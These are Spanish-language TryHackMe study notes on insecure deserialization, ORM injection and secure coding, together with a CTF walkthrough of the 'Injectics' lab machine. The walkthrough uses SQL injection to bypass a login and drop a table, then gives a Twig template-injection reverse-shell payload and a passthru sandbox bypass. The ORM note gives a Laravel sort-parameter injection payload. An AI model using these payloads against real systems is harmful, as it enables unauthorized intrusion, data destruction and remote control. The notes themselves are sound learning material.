[
  {
    "title": "2. Some Important Concepts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/2-some-important-concepts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/2. Some Important Concepts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Antes de hablar sobre deserialización insegura en detalle, es crucial entender el concepto básico.\n\n----------------------------------------\n<h2>Serialización</h2>\nPiensa en la serialización como preparar tu mochila por la mañana. Tienes libros, cuadernos, botella de agua y tienes que organizarlo en tu mochila. La seriialización es coger diferentes piezas de información y ponerlas juntas para hacer que sean fáciles de guardar o mandar.\n\n![[Pasted image 20260119113302.png]]\n\nEn programación, la serialización es el proceso de transformar el estado de un objeto en formato legible por humanos o binario que puede ser guardado o transmitido y reconstruído cuando se requiera. Esta capacidad es esencial en aplicaciones donde la información debe ser transferida entre partes diferentes de un sistema o a través de la red. En PHP este proceso lo realiza la función `serialize()`.\n\n<h4>Ejemplo</h4>\n```php\n<?php\n$noteArray = array(\"title\" => \"My THM Note\", \"content\" => \"Welcome to THM!\");\n$serialisedNote = serialize($noteArray);  // Converting the note into a storable format\nfile_put_contents('note.txt', $serialisedNote);  // Saving the serialised note to a file\n?>\n```\n\nEl siguiente output muestra la string serializada en el archivo `note.txt`, el cual incluye detalles de la estructura y contenido de la nota.\n\n**Serialised Note**: `a:2:{s:5:\"title\";s:12:\"My THM Note\";s:7:\"content\";s:12:\"Welcome to THM!\";}`\n\n-----------------------------------------------\n<h2>Deserialización</h2>\nImagina que llegas a la escuela y necesitas lo que has guardado en la mochila esta mañana. La deserialización es como desempaqueta tu mochila cuando llegas a clase. La deserialización es el proceso de convertir la información formateada de vuelta en un objeto. Es crucial para recuperar información de archivos, bases de datos o a través de la red.\n\n![[Pasted image 20260119113938.png]]\n\nSiguiendo el anterior ejemplo, aquí está cómo deserializaríamos la nota en PHP:\n\n```php\n<?php\n$serialisedNote = file_get_contents('note.txt');  // Reading the serialised note from the file\n$noteArray = unserialize($serialisedNote);  // Converting the serialised string back into a PHP array\necho \"Title: \" . $noteArray['title'] . \"<br>\";\necho \"Content: \" . $noteArray['content'];\n?>\n```\n\nEste código lee la nota serializada de un archivo y la convierte de vuelta en un array, reconstruyendo la nota original.\n\n-------------------------------------------------\n<h2>Incidentes Específicos que Involucran Vulnerabilidades de Serialización</h2>\nHablemos de incidentes específicos donde las vulnerabilidades de serialización jugaron un rol crítico en las brechas de ciberseguridad.\n\n<h4>Log4j Vulnerability CVE-2021-44228</h4>\n- **Incidente:** La [vulnerabilidad Log4j](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), o Log4Shell, es una debilidad de seguridad crítica encontrada en la librería Log4j de Apache2, usada ampliamente en aplicaciones Java. Esta vulnerabilidad permite a los atacantes ejecutar código arbitrario en los sistemas afectados explotando la funcionalidad de deserialización insegura de la librería.\n- **Impacto:** El hecho de permitir a los atacantes ejecutar código arbitrario hizo que los atacantes pudieran comprometer infraestructura crítica, llevando a acceso no autorizado, disrupción del servicio y ataques de cadena de suministro.\n\n<h4>WebLogic Server Remote Code Execution CVE-2015-4852</h4>\n- **Incidente:** Esta vulnerabilidad estaba relacionada con cómo el [Servidor WebLogic de Oracle](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html) mandaba la información al protocolo T3. Los atacantes podían mandar objetos maliciosos al servidor, que al deserializarlo llevaba a RCE.\n- **Impacto:** Esta vulnerabilidad fue ampliamente explotada para ganar acceso no autorizado a sistemas, desplegar ransomware o robar informaciñon. Afectó a las versiones de WebLogic server que no deshabilitó el servicio vulnerable o pparcheó el problema.\n\n<h4>Jenkins Java Deserialisation CVE-2016-0792</h4>\n- **Incidente:** [Jenkins](https://www.tenable.com/plugins/nessus/89034) es un servidor de automatización popular usado en el desarrollo de software. Experimentó una vulnerabilidad crítica que involucraba la deserialización Java. Los atacantes podían mandar payloads serializados a Jenkins CLI, la cual al deserializar permitía RCE.\n- **Impacto:** Permitió a atacantes ejecutar comandos de shell, potencialmente tomando posesión del servidor Jenkins.",
    "modified": "2026-01-20T00:54:21"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "El input proporcionado por el usuario ha sido consistentemente un catalizador para las vulnerabilidades, suponiendo un riesgo persistente para numerosas plataformas y aplicaciones. Otro riesgo no tan entendido pero igualmente peligroso es la deserialización insegura.\n\nLos exploits de deserialización insegura ocurren cuando una aplicación confía en información serializada lo suficiente para usarla sin validar su autenticidad, lo que puede llevar a resultados desastrosos.Este tipo de vulnerabilidad está presente en aplicaciones que serializan y deserializan estructuras complejas de datos a lo largo de varios entornos de programación. como Java, .NET y PHP.\n\n--------------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad ganaremos conocimiento en:\n\n- Cómo funcionan los procesos de serialización y deserialización.\n- Riesgos potenciales de aplicaciones web.\n- Técnicas de explotación.\n- Medidas de mitigación.\n\n--------------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2026-01-19T00:59:19"
  },
  {
    "title": "1. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/8-injectics/1-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/1. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 8. Injectics",
    "content": "1. Vamos a empezar como siempre, con escaneos:\n\t1. Primero un escaneo a la IP, general.\n\t   ![[Pasted image 20260117123157.png]]\n\t2. Luego un escaneo más profundo a aquellos puertos abiertos.\n\t   ![[Pasted image 20260117123343.png]]\n\t3. Seguimos con enumeración de directorios.\n\t   ![[Pasted image 20260117134945.png]]\n\t4. Vamos a buscar archivos comunes, para ello usamos `dirsearch` que ya prueba algunas extensiones comunes por defecto.\n\t   ![[Pasted image 20260117135831.png]]\n\t5. Miramos el código fuente.\n\t   ![[Pasted image 20260117131123.png]]\n\t   Parece que hemos encontrado un email válido y el archivo donde se guardan estos.\n2. Ahora que tenemos unos cuantos directorios vamos a recopilar información de la aplicación web.\n\t1. Empezando por el archivo `robots.txt`.\n\t   ![[Pasted image 20260117123714.png]]\n\t   No existe por lo que ya lo descartamos.\n\t2. Vamos a ver qué hay en la página principal.\n\t   ![[Pasted image 20260117123816.png]]\n\t   ![[Pasted image 20260117123859.png]]\n\t3. Si buscamos en estos botones, todos nos llevan a `#` menos `Login` que nos lleva a `login.php`.\n\t   ![[Pasted image 20260117124157.png]]\n\t   Volveremos aquí más tarde.\n\t4. Vamos a ver qué vemos por los directorios que habíamos sacado del escaneo de directorios.\n\t   ![[Pasted image 20260117124439.png]]\n\t   La página `phpmyadmin` es la única que no aparece `403 Forbidden`.\n3. Si miramos algunos de los archivos que encontramos con `dirsearch` encontramos lo siguiente.\n   ![[Pasted image 20260117135932.png]]\n   ![[Pasted image 20260117140008.png]]\n   Parece que hemos encontrado el framework de la web.\n4. Vamos a investigar la página `login.php`.\n\t1. Si le damos a `Login as Admin`, nos lleva a la página `adminLogin007.php`.\n\t   ![[Pasted image 20260117124651.png]]\n\t2. Vamos a intentar iniciar sesión en el login normal y ver que pasa con Burp Suite.\n\t   ![[Pasted image 20260117130222.png]]\n\t   Salta esto y ni siquiera llega a salir del cliente.\n\t3. Si investigamos un poco podemos llegar hasta el JS que hace que salte esta alerta.\n\t   ![[Pasted image 20260117130351.png]]\n\t   Aquí podemos ver que si esas palabras están contenidas no nos dejará acceder ni siquiera a la petición de login, al haber puesto \"n**or**mal\" está cogiendo el \"or\" dentro de esta.\n\t4. Cambiamos el Email y volvemos a probar.\n\t   ![[Pasted image 20260117130816.png]]\n\t5. Ahora que ya tenemos la petición, vamos a jugar en Burp Suite.\n\t\t1. Lo primero vamos a ver si el filtro de \"OR\" está sólo del lado del cliente.\n\t\t   ![[Pasted image 20260117130921.png]]\n\t\t   Hemos puesto \"prueban**or**mal\" y nos sale lo mismo que en la petición de arriba, por lo que parece que sí, sólo era un filtro del lado del cliente.\n\t\t2. Vamos a probar a enviar ahora una petición con un correo real: `dev@injectics.thm`.\n\t\t   ![[Pasted image 20260117131359.png]]\n\t\t   Parece que no podemos obtener información de aquí. \n5. Si recordamos el escaneo, había un archivo donde se guardaban los correos: `mail.log`\n   ![[Pasted image 20260117131832.png]]\n   Estas credenciales sólo valdrían si algo le pasara a la tabla `users` por lo que no nos valen.\n6. Vamos a probar diferentes payloads de alguna [lista de github](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/SQL-Injection-Auth-Bypass-Payloads.txt) en el Intruder de Burp Suite. Primero probaremos en el campo email.\n   ![[Pasted image 20260117133044.png]]\n7. Después de esperar un poco obtenemos el payload.\n   ![[Pasted image 20260117133252.png]]\n8. Cambiamos la cookie de sesión `PHPSESSID` al valor hecho en la petición validada y vamos al endpoint que nos marca la respuesta.\n   ![[Pasted image 20260117133650.png]]\n9. Si recordamos lo que decía la página de `mail.log` era que si algo le pasaba a la tabla `users` se habilitarían las cuentas que aparecían allí. Vamos a editar alguna entrada y a corroborar esto.\n   ![[Pasted image 20260117133809.png]]\n   Después de hacer esto e intentar loguearnos como admin parece que nada cambia.\n10. Vamos a intentar introducir un cambio con una query (ataque de segundo orden SQLi).\n   ![[Pasted image 20260117134336.png]]\n   Parece que hay validación, vamos a cambiar el payload.\n11. Probamos ahora a quitar las comillas.\n    ![[Pasted image 20260117134424.png]]\n    Parece que ahora sí nos deja.\n    ![[Pasted image 20260117134447.png]]\n    Y encima se han cambiado todos los oros.\n12. Vamos a borrar la base de datos, por lo que decía en el email.\n    ![[Pasted image 20260117134543.png]]\n    ![[Pasted image 20260117134601.png]]\n13. Vamos ahora a iniciar sesión como admin.\n    ![[Pasted image 20260117134659.png]]\n14. Si recordamos el análisis, el motor de plantillas era twig que permite crear dinamismo mediante etiquetas como `{{ }}`.\n    ![[Pasted image 20260117140315.png]]\n15. Parece que es susceptible de SSTI.\n    ![[Pasted image 20260117140343.png]]\n16. Si probamos ahora a poner `{{ system(\"ls\") }}`, nos salta con:\n    ![[Pasted image 20260117140645.png]]\n17. Encontramos la forma de mandarnos una reverse shell `{{ [\"bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/PUERTO_ATACANTE 0>&1'\"] | map(\"system\") | join }}`.\n\t1. Nos ponemos en escucha.\n\t   ![[Pasted image 20260117141147.png]]\n\t2. Metemos el payload en la plantilla.\n\t   ![[Pasted image 20260117141308.png]]\n\t3. Por desgracia nos salta un error.\n\t   ![[Pasted image 20260117141615.png]]\n18. Después de mucho quebradero de cabeza y de darnos cuenta de que estamos en una sandbox con restricciones (debido a que `passthru` lo pone), llegamos a un payload que funciona: `{{['id','']|sort('passthru')}}`. Aquí creamos un array así `['id', '']`. Después con sort especificamos la función de ordenado, pero esto no comprueba que sea una función de ordenado, solo lo intenta ejecutar. Passthru en PHP ejecuta un comando del sistema operativo y muestra su salida sin procesar.\n    ![[Pasted image 20260117145310.png]]\n    ![[Pasted image 20260117145324.png]]\n19. Listamos el directorio `/flags` sustituyendo `id` por `ls flags`.\n    ![[Pasted image 20260117145453.png]]\n20. Leemos el documento.\n    ![[Pasted image 20260117145558.png]]\n    \n21. Obtenemos la flag.\n    ![[Pasted image 20260117145609.png]]\n\n>[!SUCCESS] Hemos conseguido obtener ambas flags. Para ello hemos tenido que utilizar SQLi de primer y segundo orden para obtener la primera flag y más adelante SSTI para obtener la segunda flag.",
    "modified": "2026-01-18T00:59:42"
  },
  {
    "title": "6. ORM Injection - Vulnerable Implementation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/6-orm-injection-vulnerable-implementation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/6. ORM Injection - Vulnerable Implementation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Aunque las prácticas de programación seguras son esenciales, también es importante reconocer cómo un desarrollador puede implementar sin querer una versión vulnerable de ORM, creando vías para la explotación. Ocurre cuando los desarrolladores usan librerías ORM mal configuradas o antiguas. Los desarrolladores deben asegurarse de estar usando versiones actualizadas y seguras de dichas librerías.\n\n----------------------------------------\n<h2>Ejemplo Práctico</h2>\nUno de estos ejemplos es el paquete de construcción de queries de Laravel, el cual tuvo una vulnerabilidad de seguridad importante en versiones anteriores a la 1.17.1. Esta vulnerabilidad permitía la inyección SQL mediante parámetros query no sanitizados. La vulnerabilidad fue identificada en cómo manejaba el paquete los parámetros de búsqueda sin validación adecuada. Hemos usado el [Spatie query builder](https://github.com/spatie/laravel-query-builder) para este ejemplo, lo que también usa el Laravel's query builder internamente.\n\nPara demostrar esta vulnerabilidad puedes acceder a `https://IP.reverse-proxy.cell-prod-us-east-1b.vm.tryhackme.com/query_users?sort=name`. Este endpoint permite recuperar los usuarios de arriba ordenados por la columna `name` vía el parámetro `sort`.\n\n![[Pasted image 20260116135729.png]]\n\nEl traducción de query equivalente de Laravel es `SELECT * FROM users ORDER BY name ASC LIMIT 2`.\n\n<h4>Intento de Inyección</h4>\nSi intentamos inyectar el parámetro nombre con `name'`, veremos que la app devuelve un error de que no pudo encontrar el nombre de la columna.\n\n![[Pasted image 20260116142050.png]]\n\nNuestro objetivo aquí es manipular la query para obtener la información completa de la tabla `users` en lugar de ser restringidos a un número de filas.\n\nSin embargo, inyectar el parámetro sort en este contexto no es tan fácil como concatenar el `SELECT` y usar métodos de inyección rutinarios. El reto yace en romper efectivamente la cláusula `ORDER BY` para manipular la ejecución. Para conseguir esto, podemos utilizar una función especial: el operador `->` el cual sirve como alias de la función `json_extract` en MySQL. Este operador nos permite navegar la información JSON y extraer valores específicos. Usando el operador `->` en conjunción con el payload `\"%27))`, podemos romper la cláusula `ORDER BY`. El payload `->\"%27))` termina efectivamente la extracción JSON, bypasseando las limitaciones impuestas por la query inicial y permitiéndonos añadir comandos SQL adicionales.\n\n<h4>Payload Final</h4>\nPrepararemos el payload final de la siguiente manera:\n\n- **Query Inicial:** La query inicial que Laravel traduce para mostrar a los usuarios pertinentes es `SELECT * FROM users ORDER BY name ASC LIMIT 2`.\n- **Rompiendo la Query:** Inyectando `name->\"%27))`, podemos causar la ruptura de la query para crear una oportunidad de inyectar nuestro propio SQL.\n- **Construyendo el Payload:** Para explotar esta vulnerabilidad, construimos el payload para que rompa la string e inyecte el SQL. El payload debería ser algo como `name->\"%27)) SQL INJECTION QUERY #`. En el valor de parámetro `name->`, el operador `->` es parseado por Laravel y reemplazado con la función MySQL JSON. Por otro lado, `\"%27))` cierra la string y condición anteriores. `SQL INJECTION QUERY` permite al atacante escribir su propia query. El carácter `#` comenta el resto de la linea.\n- **Resultado Final:** El payload para obtener las filas adicionales de la base de datos sería `SELECT * FROM 'users' ORDER BY json_unquote(json_extract('name', '$.\"\"')) LIMIT 10#\"')) ASC LIMIT 2`, incluyendo el payload inyectado.\n\n![[Pasted image 20260116143658.png]]",
    "modified": "2026-01-17T00:53:14"
  },
  {
    "title": "7. Best Practices",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/7-best-practices/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/7. Best Practices.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Ahora que entendemos la superficie de ataque de la inyección ORM, prevenir estas vulnerabilidades requiere implementar medidas de seguridad robustas y monitorizar continuamente debilidades potenciales.\n\n--------------------------------------\n<h2>Algunas Prácticas Importantes</h2>\n- **Validación de Input:** Valida siempre el input del usuario del lado del cliente y del lado del servidor. Asegúrate de que la información introducida cumple con formato, tipo y longitud.\n- **Queries Parametrizadas:** Usa queries parametrizadas (prepared statements) para interactuar con la base de datos.\n- **Uso de ORM:** Utiliza las herramientas integradas del ORM para interactuar con la base de datos. \n- **Escapado y Sanitización:** Escapa y sanitiza siempre el input del usuario para eliminar caracteres especiales e información maliciosa.\n- **Lista de Inputs Permitidos:** Implementa un alista para la validación de inputs. Permite sólo específicos (whitelist).\n\n------------------------------------------\n<h2>Aplicación en Frameworks Populares</h2>\nExploraremos prácticas esenciales para salvaguardarnos de la inyección ORM en frameworks ORM populares. Herramientas ORM como Doctrine (PHP), SQLAlchemy (Python), Hibernate (Java) y Entity Framework (.NET) ofrecen abstracciones poderosas para interactuar con bases de datos. Sin embargo, para prevenir vulnerabilidades de inyección SQL, es crucial emplear prácticas de programación segura.\n\n<h4>Doctrine (PHP)</h4>\nUsa statements preparados con queries parametrizadas para prevenir los ataques de inyección SQL.\n\n```php\n$query = $entityManager->createQuery('SELECT u FROM User u WHERE u.username = :username');\n$query->setParameter('username', $username);\n$users = $query->getResult();\n```\n\n<h4>SQLAlchemy (Python)</h4>\nUsa el ORM de SQLAlchemy y Query API para usar queries parametrizadas, que escapan automáticamente.\n\n```python\nfrom sqlalchemy.orm import sessionmaker\nSession = sessionmaker(bind=engine)\nsession = Session()\nuser = session.query(User).filter_by(username=username).first()\n```\n\n<h4>Hibernate</h4>\nUsa parámetros nombrados con la Query API de Hibernate para asegurar que los inputs sean correctamente escapados.\n\n```java\nString hql = \"FROM User WHERE username = :username\";\nQuery query = session.createQuery(hql);\nquery.setParameter(\"username\", username);\nList results = query.list();\n```\n\n<h4>Entity Framework (.NET)</h4>\nEmplea queries parametrizadas en el Entity Framework para securizar las interacciones de la base de datos y mitiga el riesgo de vulnerabilidades de inyección SQL.\n\n```C#\nvar user = context.Users.FirstOrDefault(u => u.Username == username);\n```",
    "modified": "2026-01-17T00:53:14"
  }
]